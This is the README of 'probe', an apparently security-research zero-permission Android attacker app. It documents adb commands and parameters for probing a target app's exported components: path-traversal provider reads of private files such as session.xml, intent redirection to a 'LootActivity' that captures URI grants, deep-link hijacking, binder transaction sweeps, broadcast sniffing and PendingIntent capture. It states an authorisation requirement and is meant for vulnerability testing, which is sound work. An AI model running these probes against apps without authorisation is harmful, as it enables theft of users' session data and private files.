# attacker-app — `probe`

The zero-permission test application. **This is how attacker model AM-03 is established.**

> `adb shell am start` runs as the **shell** UID, which holds far more privilege than any installed app.
> Discovery with adb is fine; **a finding proved only by adb has not established AM-03.** Re-prove every
> candidate from this app, and commit its manifest as evidence — the argument is the *absence* of any
> `<uses-permission>` element, and the `ready` line measures it (`requestedPermissions=[]`) rather than asserting it.

## Build (no wrapper jar is committed)

```bash
cd attacker-app
./build.sh --victim com.target.app --install          # bakes the victim into <queries>; adb install -r
./build.sh --victim com.target.app --hijack-scheme targetapp --install   # D09: LootActivity claims the scheme
```

`build.sh` checks for a JDK ≥ 17 and Gradle ≥ 8.7 (AGP 8.5.2) **before** building and exits 2 with the exact
requirement; with only a system Gradle it generates the wrapper once (`gradle/wrapper/gradle-wrapper.properties`
pins 8.9; the jar is never committed). Without `--victim` the `<queries>` entry is `com.victim.app` and `enumerate`
degrades to a package-visibility artefact — the `ready` line prints `queries=<baked value>` so the log proves which
package was visible. A companion app needs a second build (or a second `<package>` line).

**targetSdk (35 in `app/build.gradle`) gates the SENDER side, not the victim's.** Export defaults and PendingIntent
mutability are decided by the *victim's* manifest and targetSdk; the probe's own targetSdk decides: 30+ package
visibility (`<queries>`), 33+ `RECEIVER_EXPORTED` for runtime receivers, 34+ implicit intents can no longer reach
*our own* non-exported components, 36+ stricter intent-filter matching. When a delivery differs between SDK levels,
build two variants (targetSdk 29 "legacy sender" and current) and record which one the finding needs. The `ready`
line prints the targetSdk the APK was actually built with.

## Drive it headlessly (what a model does)

```bash
adb shell am start -S -n com.sanehunters.probe/.MainActivity \
  --es run baseline,enumerate,provider,read,redirect,deeplink \
  --es victim com.target.app \
  --es finding F-001 --es class "exported provider -> private file read" \
  --es authority com.target.app.fileprovider \
  --es uri "content://com.target.app.fileprovider/root/data/data/com.target.app/shared_prefs/session.xml" \
  --es proxy com.target.app.ProxyActivity --es extra intent --es mode loot \
  --es deeplink "targetapp://open?url=https://example.test/" \
  --ez finish false
adb logcat -s PROBE:V                                   # one line per result:  PROBE|<step>|<key>=<value>
adb pull /sdcard/Android/data/com.sanehunters.probe/files/ "$E/logs/probe/"   # the file mirror (below)
```

**Always `-S`.** Without it a second `am start` while the probe is alive is "delivered to top" and runs nothing
(the activity is `singleTop` with `onNewIntent`, so it *would* re-run, but `-S` guarantees a clean `onCreate`
and the `ready` line says which path ran: `launch=onCreate|onNewIntent`). Scripted loops give each fire its own
action so no two fires are ever collapsed:

```bash
for N in 1 2 3; do
  adb shell am start -S -a "probe.fire.$N" -n com.sanehunters.probe/.MainActivity --es run provider --es authority "$AUTH" --es verbs query --es paths "/$N"
done
```

Every line goes to logcat, to the on-screen pane **and** to `files/probe-<session>.log` under the app's
external-files directory (no permission needed) — some stock builds drop app-level `Log.i` entirely and a busy
logcat ring buffer rotates in minutes. The `ready` line prints the mirror path; pull it before reading any zero.

### Steps (`--es run a,b,c`)

| Step | Domain | What it does and prints |
|---|---|---|
| `baseline` | — | Beat 4: measured `requestedPermissions=[]`, `checkUriPermission=-1 (DENIED)` and the failing direct read, *before* any test |
| `enumerate` | D03–D06 | the victim's exported components as an unprivileged UID sees them; `getPackageInfo_failed=…` names the package-visibility artefact |
| `provider` | D07 | **positive control first** (`--es control`, default `content://settings/secure`), then the full verb matrix per path; every result is `t.toString()` verbatim (class + message, D07-010) |
| `read` | D07 | the read under test, with byte count and head |
| `redirect` | D08 | nested Intent through the victim's exported proxy; `mode=loot` targets our `LootActivity` so a forwarded URI grant is recorded (`PROBE\|loot\|…`), `mode=internal` targets a victim-internal component |
| `deeplink` | D09 | fires a `BROWSABLE` `VIEW` intent — exactly what a web page can do |
| `start` | D04/D08/D09 | explicit component (or implicit action) with **typed extras**; `--ez browsable false` = non-BROWSABLE implicit VIEW; `--ez forresult true` dumps `PROBE\|result\|resultCode/data/grant_read/clip/extras` and reads a granted URI |
| `broadcast` | D05 | `sendBroadcast` explicit or implicit, `--es receiverperm <perm>` to send with a permission, `--ez ordered true` prints the ordered result (a non-default result = a receiver handled it) |
| `bind` | D06 | `bindService` → descriptor + ping, then a `transact` sweep over `--es codes 1-64` with an interface token (`--es descriptor`, default = the binder's own) and `--ez callback true` to hand the service a Binder of ours (`PROBE\|bind\|callback_transact=…`); `DUMP_TRANSACTION` through a pipe |
| `getservice` | D06/D25 | `ServiceManager.getService` by reflection for `--es services a,b`: `binder=null` vs class + descriptor + ping |
| `sniff` | D05 | runtime-registered **exported** receiver for `--es actions a,b` kept for `--ei window 60` s, ended by a positive-control broadcast to ourselves: `PROBE\|sniff\|done\|received=N (control_seen=true)` — `control_seen=false` means every zero is UNVERIFIED |
| `picanary` | D08 | hands `--es component` a mutable PendingIntent to `LootActivity` under `--es pikey`; `PROBE\|loot\|extra=probe_canary` proves the victim sent it |

`HijackActivity` (D04 taskAffinity) and the manifest `Sniffer` block (explicit/ordered broadcasts only) stay disabled;
enable their manifest blocks as needed. A manifest receiver never sees an implicit broadcast on API 26+ — use `sniff`.

### Every extra

| Extra | Type | Steps | Default |
|---|---|---|---|
| `run` | s | — | none (buttons) — comma list of steps |
| `victim` | s | all | the baked `<queries>` value |
| `finding`, `class`, `precond` | s | header | `F-001`, `exported provider -> private file read`, measured at `ready` |
| `authority`, `uri` | s | provider, read, baseline, redirect | unset |
| `verbs` | s | provider | all 18: `query,query-projection,query-selection,insert,update,delete,getType,openFile,openFileDescriptor,openAssetFile,openTypedAssetFile,getStreamTypes,bulkInsert,applyBatch,canonicalize,uncanonicalize,refresh,call` |
| `methods` | s | provider (`call`) | `test,getInfo,get,init` — take the names from the decompiled `call()` switch |
| `paths` | s | provider | `,/,/1,/..,/..%2f..%2fshared_prefs` |
| `control` | s | provider | `content://settings/secure` (empty string disables) |
| `proxy`, `target`, `extra`, `mode` | s | redirect | unset, unset, `intent`, `loot` |
| `deeplink` | s | deeplink | unset |
| `component` | s | start, broadcast, bind, picanary | `pkg/cls`, `pkg/.cls` or `.cls` (resolved against `victim`) |
| `action` (`actions`) | s | start, broadcast, bind, picanary, sniff | unset; comma list for `sniff` |
| `category` | s | start, broadcast, sniff | unset (comma list) |
| `data` | s | start, broadcast | unset |
| `extras` | s | start, broadcast, bind (Parcel order), redirect (inner), picanary | typed grammar below |
| `flags` | i | start, broadcast | 0 (added to the Intent) |
| `browsable`, `forresult` | z | start | `true`, `false` |
| `receiverperm`, `ordered` | s, z | broadcast | unset, `false` |
| `descriptor`, `codes`, `callback`, `dump` | s, s, z, z | bind | binder's own, unset (no sweep), `false`, `true` |
| `services` | s | getservice | unset (names from `adb shell service list`) |
| `window` | i | sniff | 60 seconds |
| `pikey` | s | picanary | `pendingIntent` |
| `finish` | z | — | `false`; waits for async steps (bind, sniff) before finishing |

**Typed-extras grammar** (`--es extras "…"`, entries separated by `;`): `name:type=value` with types
`s` string · `i` int · `l` long · `z` boolean · `f` float · `d` double · `u` Uri · `b64` byte[] · `sa` string[] (comma) ·
`ia` int[] (comma) · `intent` nested Intent (`pkg/cls`, or `loot` = our LootActivity carrying `--es uri` with grant flags;
`loot?action=X` sets its action) · `bundle` nested Bundle (same grammar with `,` between entries and `|` instead of `=`).
Example: `--es extras "url:s=https://x/;n:i=3;ok:z=true;f:u=content://a/b;cb:intent=loot;raw:b64=AAEC"`.
Shell quoting: pass the whole value in double quotes; `am start` splits on spaces, not on `;`.

## The log pane is the narration

Raw platform return values with their meaning in parentheses — `checkUriPermission=0 (0=GRANTED, -1=DENIED)`
— never a paraphrase. Everything it prints is a **candidate**; the finding is what the chain reaches (P7).
See [`docs/04-poc-and-evidence-standard.md`](../docs/04-poc-and-evidence-standard.md).

## Never

Point this at an app you are not authorised to test · exfiltrate a third party's data (plant canary values) ·
add a `<uses-permission>` for convenience (the finding drops to AM-04 and the `ready` line will say so) ·
commit a built APK or a Gradle wrapper jar to this repository (the built APK and its sha256 travel in the
vendor bundle / the private evidence remote; `pocs/` holds source).
